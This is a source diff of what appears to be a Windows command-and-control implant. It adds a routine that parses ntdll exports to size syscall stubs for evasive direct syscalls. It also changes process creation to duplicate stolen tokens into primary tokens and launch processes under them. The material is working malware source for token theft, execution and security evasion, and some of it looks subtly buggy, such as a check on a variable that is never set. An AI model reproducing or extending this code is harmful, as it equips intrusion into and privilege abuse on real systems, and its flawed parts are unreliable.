@@ -218,10 +218,10 @@ PVOID LdrModuleLoad(
     UNICODE_STRING UnicodeString  = { 0 };
     WCHAR          NameW[ 260 ]   = { 0 };
     PVOID          Module         = { 0 };
-    USHORT         DestSize       = { 0 };
-    HANDLE         Event          = { 0 };
-    HANDLE         Queue          = { 0 };
-    HANDLE         Timer          = { 0 };
+    USHORT         DestSize       = 0;
+    HANDLE         Event          = NULL;
+    HANDLE         Queue          = NULL;
+    HANDLE         Timer          = NULL;
     DWORD          Count          = 5;
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
@@ -322,6 +322,7 @@ PVOID LdrModuleLoad(
 
         /* if module still hasn't been found then go to default */
         if ( ! Module ) {
+            PUTS( "Module was not loaded, try with default technique" )
             goto DEFAULT;
         }
     }
@@ -431,6 +432,80 @@ PVOID LdrFunctionAddr(
     return NULL;
 }
 
+/*
+ * Get the size of an NtApi by finding two consecutive syscalls
+ * and returning the difference of their addresses.
+ * This can't be static because it changes between releases.
+ */
+UINT32 GetSyscallSize(
+    VOID
+) {
+    PVOID                   Module           = Instance.Modules.Ntdll;
+    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
+    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
+    SIZE_T                  ExpDirectorySize = { 0 };
+    PDWORD                  AddrOfFunctions  = { 0 };
+    PDWORD                  AddrOfNames      = { 0 };
+    PWORD                   AddrOfOrdinals   = { 0 };
+    PVOID                   FunctionAddr     = { 0 };
+    PCHAR                   FunctionName     = { 0 };
+    ANSI_STRING             AnsiString       = { 0 };
+    PVOID                   Addr1            = NULL;
+    PVOID                   Addr2            = NULL;
+    UINT32                  SyscallSize      = 0;
+    UINT32                  Offset           = 0;
+
+    if ( ! Module )
+        return 0;
+
+    if ( Instance.Syscall.Size )
+        return Instance.Syscall.Size;
+
+    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
+    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
+    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
+
+    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
+    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
+    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );
+
+    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
+    {
+        /* ignore redirect functions */
+        if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
+             ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
+            continue;
+
+        // make sure is a system call
+        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
+        if (*(USHORT*)FunctionName != 0x775a)
+            continue;
+
+        // save one random syscall addr
+        if ( ! Addr1 )
+        {
+            Addr1 = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            continue;
+        }
+        else
+        {
+            // get the distance between our saved syscall addr and this one
+            Addr2  = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            Offset = ( ULONG_PTR ) Addr1 > ( ULONG_PTR ) Addr2 ? ( ULONG_PTR ) Addr1 - ( ULONG_PTR ) Addr2 : ( ULONG_PTR ) Addr2 - ( ULONG_PTR ) Addr1;
+
+            // if the distance is the smallest we have seen so far, save it
+            if ( ! SyscallSize || Offset < SyscallSize ) {
+                SyscallSize = Offset;
+            }
+        }
+    }
+
+    // by now, we should have the size of a syscall stub
+    Instance.Syscall.Size = SyscallSize;
+
+    return Instance.Syscall.Size;
+}
+
 /*!
  * opens a handle to the specified pid with specified access
  * @param ProcessID
@@ -516,6 +591,8 @@ BOOL ProcessCreate(
     BOOL            Return             = TRUE;
     PVOID           Wow64Value         = NULL;
     BOOL            DisabledWow64Redir = FALSE;
+    BOOL            DisabledImp        = FALSE;
+    HANDLE          PrimaryToken       = NULL;
 
     StartUpInfo.cb          = sizeof( STARTUPINFOA );
     StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -570,6 +647,7 @@ BOOL ProcessCreate(
             lpCurrentDirectory = Path;
         }
 
+        DisabledImp = TRUE;
         TokenImpersonate( FALSE );
         TokenSetSeImpersonatePriv( TRUE );
 
@@ -578,9 +656,21 @@ BOOL ProcessCreate(
 
         if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
+            // Duplicate to make primary token (try delegation first)
+            if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &PrimaryToken ) )
+            {
+                if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &PrimaryToken ) )
+                {
+                    PRINTF( "Failed to duplicate token [%d]\n", NtGetLastError() );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    Return = FALSE;
+                    goto Cleanup;
+                }
+            }
+
             PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance.Win32.CreateProcessWithTokenW(
-                    Instance.Tokens.Token->Handle,
+                    PrimaryToken,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
                     CmdLine,
@@ -593,7 +683,6 @@ BOOL ProcessCreate(
                     )
             {
                 PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
@@ -617,14 +706,11 @@ BOOL ProcessCreate(
                     ProcessInfo
             ) ) {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
-                TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
             }
         }
-
-        TokenImpersonate(TRUE);
     }
     else
     {
@@ -677,14 +763,8 @@ BOOL ProcessCreate(
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
 
-            PUTS( "Cleanup" )
-            MemSet( s, 0, x );
-            Instance.Win32.LocalFree( s );
+            DATA_FREE( s, x );
         }
-    }
-
-    if ( Piped ) {
-        JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
     }
 
     Cleanup:
@@ -693,6 +773,32 @@ BOOL ProcessCreate(
         Instance.Win32.Wow64RevertWow64FsRedirection( Wow64Value );
     }
 #endif
+
+    if ( Return && Piped ) {
+        JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
+    }
+    else if ( ! Return && Piped )
+    {
+        if ( AnonPipe->StdOutWrite ) {
+            SysNtClose( AnonPipe->StdOutWrite );
+            AnonPipe->StdOutWrite = NULL;
+        }
+
+        if ( AnonPipe->StdOutRead ) {
+            SysNtClose( AnonPipe->StdOutRead );
+            AnonPipe->StdOutRead = NULL;
+        }
+
+        DATA_FREE( AnonPipe, sizeof( ANONPIPE ) );
+    }
+
+    if ( PrimaryToken ) {
+        SysNtClose( PrimaryToken );
+    }
+
+    if ( DisabledImp ) {
+        TokenImpersonate( TRUE );
+    }
 
     return Return;
 }
